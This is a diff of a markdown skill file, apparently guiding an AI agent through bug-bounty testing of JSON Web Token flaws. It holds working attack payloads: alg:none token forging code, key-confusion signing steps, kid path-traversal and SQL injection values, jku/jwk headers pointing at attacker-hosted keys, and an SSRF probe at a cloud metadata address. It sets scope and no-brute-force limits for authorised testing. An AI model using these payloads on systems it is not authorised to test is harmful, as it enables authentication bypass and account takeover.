@@ -1,69 +1,103 @@
 ---
 name: hunt-jwt
-description: "Hunt JSON Web Token flaws — alg:none / alg-casing, RS256->HS256 key confusion (sign with the RSA public key as the HMAC secret), kid header injection (path traversal / SQLi), jku/x5u/jwk header pointing at an attacker JWKS, claim tampering (sub/role/tenant/aud), missing expiry or no server-side revocation (replay after logout), and access/refresh/audience token confusion. Use whenever a request carries an eyJ... token in a header, cookie, or body. Respects the no-bruteforce rule: test only known-default / leaked secrets, never keyspace exhaustion."
+description: "Hunt JSON Web Token flaws — alg:none / alg-casing, RS256->HS256 key confusion (sign with the RSA public key as the HMAC secret), kid header injection (path traversal / SQLi), jku/x5u/jwk/x5c header pointing at an attacker JWKS, claim tampering (sub/role/tenant/aud), missing expiry or no server-side revocation (replay after logout), access/refresh/audience token confusion, nested JWT / crit / psychic-signatures. Use whenever a request carries an eyJ... token in a header, cookie, or body. Respects the no-bruteforce rule: test only known-default / leaked secrets, never keyspace exhaustion."
 sources: 0xray-authored
 ---
 
 # HUNT-JWT — JSON Web Token Attacks
 
-## Decode first
-Every `eyJ...` is base64url `header.payload.signature` — decode it with no network call. Read the
-**header** (`alg`, `kid`, `jku`/`x5u`/`jwk`) and the **claims** (`sub`, `role`, `scope`,
-`tenant`/`org`, `aud`, `iss`, `exp`, `iat`). Every attack below follows from what the header asks the
-server to trust.
+## Rails
+- In-scope only. Read-only by default. State-changing proofs only on test accounts you own.
+- **No keyspace cracking.** Try known-default / leaked HMAC secrets only — never rockyou, hashcat, or jwt_tool dictionary mode.
+- Prove the primitive **once** (one forged token → one privileged action). No mass-forging.
+- STOP at draft. Claim only a server-accepted token plus a real action.
 
-## What actually pays
-A **forged or manipulated token the server accepts**, yielding a **privileged or cross-account
-action**. A merely-decoded token, a "weak-looking" secret you never actually forged with, or an
-expired token that is correctly rejected are **not** findings.
+## Decode first (no network)
+Every `eyJ…` is `header.payload.signature` (base64url). Record `alg`, `kid`, `jku`/`x5u`/`jwk`/`x5c`, `typ`/`cty`/`crit`, and claims `sub`, `role`/`scope`/`groups`, `tid`/`org`, `aud`, `iss`, `azp`, `exp`/`nbf`/`iat`, `jti`. Attacks follow what the **header asks the server to trust**.
+
+```bash
+b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
+IFS=. read -r H P S <<<"$JWT"
+echo "H=$(b64url "$H")"; echo "P=$(b64url "$P")"; echo "sig_len=${#S}"
+```
+
+**Pays:** forged/replayed token **accepted** AND a **cross-account or privileged action**. Decode-only, "looks weak", or a correctly-rejected token is not a finding.
+
+## Decision tree (any stack)
+1. Where does the token live? (`Authorization: Bearer`, cookie, body, query, WS subprotocol.) Query-string JWTs also leak via Referer/logs (`hunt-session`).
+2. Grab verification material: `/.well-known/openid-configuration` → `jwks_uri`, `/jwks.json`, embedded PEM, mobile/APK, JS bundle. **Do not brute the secret.**
+3. Walk the attack matrix below in order. After **any** accepted forge, immediately try claim tampering (`sub`/`role`/`tid`/`aud`) on a protected route.
+4. If signature checks hold, test **acceptance bugs**: `aud`/`iss` not bound, refresh/access confusion, no `exp`, no revocation after logout/password-change.
+5. Hand session-layer persistence to `hunt-session`; hand ATO chains to `hunt-ato`.
 
 ## Attack matrix
-1. **alg:none** — set header `{"alg":"none"}` (also try `None`, `NONE`, `nOnE`) and drop the
-   signature. If accepted, you can sign arbitrary claims.
-2. **RS256 -> HS256 key confusion** — the server verifies RS256 with a public key. Re-sign the token
-   with **HS256 using the PEM public-key bytes as the HMAC secret**. If the library trusts the `alg`
-   from the header, it verifies your HMAC against the public key it already holds. Grab the key from
-   `/jwks.json`, `/.well-known/jwks.json`, an embedded cert, or the TLS chain.
-3. **Weak HMAC secret** — try only **known defaults / leaked** values (`secret`, `changeme`, the
-   framework default, a secret leaked in a JS bundle / APK / repo). **Do NOT run keyspace brute
-   force** — that violates the no-bruteforce rule; a targeted known-secret check is fine.
-4. **kid injection** — `kid` selects the verification key. Try path traversal
-   (`"kid":"../../../dev/null"` -> empty key -> sign with `""`), a predictable file path, or **SQLi in
-   `kid`** (`"kid":"x' UNION SELECT 'attacker-known-key'-- -"`) to force verification against a value
-   you control.
-5. **jku / x5u / jwk header injection** — point `jku`/`x5u` at an attacker-hosted JWKS, or embed a
-   `jwk` inline, so the server fetches/uses **your** public key to verify **your** token. This is also
-   an SSRF primitive — pair with `hunt-ssrf`.
-6. **Claim tampering** — once you can sign, flip `role` / `is_admin` / `scope` / `tenant` / `sub` for
-   privilege escalation or cross-account access.
-7. **Audience / issuer confusion** — a token minted for service/audience A accepted by service B
-   (`aud`/`iss` not validated). Common across SSO / multi-service estates — see `hunt-auth-bypass`.
-8. **Expiry & revocation** — `exp` not enforced (replay an old token); token still valid after
-   logout / password change (no server-side revocation) — see `hunt-session`.
-9. **Access / refresh confusion** — a refresh token accepted where an access token is expected, or
-   vice versa.
+
+| # | Class | Probe (copy-paste shape) | Confirm |
+|---|---|---|---|
+| 1 | **alg:none** | Header `{"alg":"none"}` / `None` / `NONE` / `nOnE` / `nONE`; drop sig **or** keep `header.payload.` (trailing dot). Some libs only skip verify when `alg` is lowercase `none`. | Forged `sub`/role accepted on `/api/me` or admin route. |
+| 2 | **RS256→HS256 confusion** | Download RSA public key (JWKS/`x5c`/TLS). Re-sign **HS256 using the PEM bytes as HMAC secret**. Also try `HS384`/`HS512`. | Server still trusts header `alg` → HMAC verifies against the public key it already holds. |
+| 3 | **Known/leaked HMAC secret** | Only: `secret`, `changeme`, framework default (`jwt-secret`, `your-256-bit-secret`, `HS256KEY`), values from JS/APK/`.env`/`hunt-source-leak`. | Forged token accepted. **Stop** — do not wordlist. |
+| 4 | **kid injection** | `"kid":"../../../dev/null"` (empty key → sign with `""`); `"kid":"/dev/null"`; `"kid":"../../../../tmp/key"` if upload exists; SQLi `"kid":"x' UNION SELECT 'deadbeef'--"`; LDAP/file URI. | Server verifies against a key **you** control or empty. |
+| 5 | **jku / x5u / jwk / x5c** | Point `jku`/`x5u` at attacker JWKS (`https://OOB/jwks.json`); embed `"jwk":{your RSA}`; inject `"x5c":["<attacker cert>"]`. Also SSRF: `jku=http://169.254.169.254/` (`hunt-ssrf`). | Server fetches **your** key and accepts **your** signature. OOB DNS/HTTP proves the fetch. |
+| 6 | **crit / cty nested JWT** | `"crit":["bork"]` — RFC 7515 requires reject-if-unknown; some libs ignore `crit` and accept. `"cty":"JWT"` with payload = another JWT (inner unsigned). | Outer verifies, inner claims used for authz. |
+| 7 | **ECDSA psychic signatures** | For `ES256`/`ES384`/`ES512`: signature of `r=0,s=0` (or `r=n,s=0`). Java 15–18 CVE-2022-21449 accepted them as valid. | Unsigned-equivalent token accepted. |
+| 8 | **Claim tampering** | Once you can sign (or if server does not verify): flip `role`/`is_admin`/`scope`/`groups`/`cognito:groups`/`tid`/`org_id`/`sub`/`aud`. | Privileged or cross-tenant action, not just a decoded claim. |
+| 9 | **aud / iss / azp confusion** | Token minted for service A (`aud=api-a` or `kubernetes`) presented to service B. Skip `aud` entirely; duplicate `aud` array; `azp` ≠ `aud`. | Cross-audience access (Argo CD-class). |
+| 10 | **Access / refresh / id_token mix** | Send refresh token as Bearer; send `id_token` to API; send API token to `/userinfo`. | Wrong token type accepted with broader claims. |
+| 11 | **exp / jti / revocation** | Replay after logout, password change, email change. Missing `exp`, `exp` years out, missing `jti`. | Same JWT still returns **unique identity marker** (body-diff). See `hunt-session`. |
+| 12 | **JWKS / issuer takeover** | `jwks_uri` on dangling host, attacker-writable CDN, or Host-header-poisoned discovery (`hunt-host-header`, `hunt-subdomain`). | You sign with the new JWKS the SP now trusts. |
+
+### alg:none
+```python
+import base64, json
+def b64(o):
+    return base64.urlsafe_b64encode(json.dumps(o,separators=(',',':')).encode()).rstrip(b'=').decode()
+print(b64({"alg":"none","typ":"JWT"})+"."+b64({"sub":"VICTIM","role":"admin"})+".")
+# also: None / NONE / nOnE; and the two-dot form with leftover junk signature stripped
+```
+
+### RS256 → HS256
+```bash
+# JWK n,e → PEM, then HMAC-sign with the PEM file bytes as the secret
+curl -s https://$TARGET/.well-known/openid-configuration | jq -r .jwks_uri
+curl -s https://$TARGET/.well-known/jwks.json
+# Burp JWT Editor → "Key confusion" / jwt_tool.py -X k  (sign only, no crack mode)
+openssl x509 -in pub.pem -pubkey -noout 2>/dev/null || openssl rsa -pubin -in jwk.pem -outform PEM
+```
+
+### jku / jwk injection
+```json
+{"alg":"RS256","jku":"https://UNIQUE.oastify.com/jwks.json","kid":"attacker"}
+{"alg":"RS256","jwk":{"kty":"RSA","kid":"atk","n":"<your n>","e":"AQAB"}}
+```
+Host a JWKS with your public key. Unique OOB hostname = proof the server fetched it.
 
 ## Tooling
-Decode/edit by hand or with a JWT tool; Burp's **JWT Editor** handles signing and the key-confusion
-attack. Use `openssl` to fetch/convert the public key. Always confirm the forged token against a
-real protected endpoint.
+Burp **JWT Editor** (none / key-confusion / claim edit). `openssl` for PEM. Decode by hand. Confirm against a **real protected endpoint**, not a public landing page.
 
-## PoC minimum
-Forged/manipulated token **accepted by the server** AND a **cross-account or privileged action
-performed** (read/write another user's data, reach an admin-only route). Capture the request carrying
-the forged token plus the response proving the action.
+## Validation (mandatory)
+- **Accepted + action:** forged/replayed token used on an authenticated route that returns **victim/admin unique data** or performs a state change you can see on a second channel.
+- **Body-diff:** 200 with a SPA shell / empty user is not impact. Diff vs unauthenticated and vs attacker-identity baseline.
+- **Negative control:** random/garbage token must fail where yours succeeds.
+- **OOB:** `jku`/`x5u`/JWKS fetch → unique Collaborator hit. SSRF-only DNS without using the fetched key to auth is `hunt-ssrf`, not JWT auth bypass.
+- **No theoretical cracking:** "HMAC might be weak" without an accepted forge is not a finding.
 
-## Before you report — dedup gate
+**Severity:** none/key-confusion/jku → admin or any-user ATO = **Critical**. Cross-tenant `tid` flip = **High–Critical**. Replay after logout (no privileged change) = **Medium–High** (`hunt-session`). `alg` reflected but rejected = **not a finding**.
 
-Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
-order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:
+## Chains
+| Primitive | Compose into | Impact |
+|---|---|---|
+| alg:none / key confusion | `sub`=victim, `role`=admin | ATO / priv-esc (`hunt-ato`) |
+| `jku`/`x5u` | SSRF + key inject | Auth bypass + internal fetch (`hunt-ssrf`) |
+| `kid` path/SQLi | File read or key oracle | Forged tokens at will |
+| `aud` skip | Token from IdP-A used on API-B | Cross-service impersonation (`hunt-auth-bypass`) |
+| No revocation | Stolen JWT + XSS/CSWSH | Persistent ATO (`hunt-session`, `hunt-xss`) |
+| Refresh as access | Long-lived token on API | Survives access-token TTL |
 
+Cross-refs: `hunt-auth-bypass`, `hunt-ato`, `hunt-session`, `hunt-oauth`, `hunt-ssrf`, `hunt-source-leak`, `security-arsenal`, `triage-validation`.
+
+## Dedup gate
 ```bash
 python3 engine/dedup.py check --program <program> --class auth-bypass --url "<endpoint>" --title "<title>"
 ```
-
-`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
-(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
-
-Cross-references: `hunt-auth-bypass`, `hunt-ato`, `hunt-session`, `hunt-api-misconfig`, `hunt-ssrf`
-(for `jku`/`x5u`), `security-arsenal`, `triage-validation`.
+`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator (endpoint/param/impact or fix bypass).
